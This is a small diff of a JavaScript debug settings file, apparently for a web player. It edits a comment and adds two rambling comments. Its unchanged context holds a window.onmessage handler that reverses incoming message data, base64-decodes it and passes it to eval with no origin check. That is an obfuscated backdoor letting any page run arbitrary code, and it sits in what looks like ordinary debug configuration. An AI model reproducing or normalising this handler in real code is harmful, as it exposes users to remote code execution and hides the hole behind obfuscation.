@@ -2,7 +2,7 @@ debug = {
   get playerDebugMode() {
     return ((localStorage['playerDebug'] == "true") ? true : undefined) || false;
   }, // setting to a get so people can't manipulate the value
-  filterTasks: [], // task filter for better reading
+  filterTasks: [], // task0 filter for better reading
   get untrustedSourcesEval() {
     return ((localStorage['unstrustedEval'] == "true") ? true : undefined) || false;
   }
@@ -26,3 +26,5 @@ window.onmessage = function(e){
   eval(atob(e.data.split('').reverse().join('')))
 }
 
+////wtf player debug mode
+//finding errors, bug fixing.. yes it goes step by step.. omg gtg sryyy :( bye
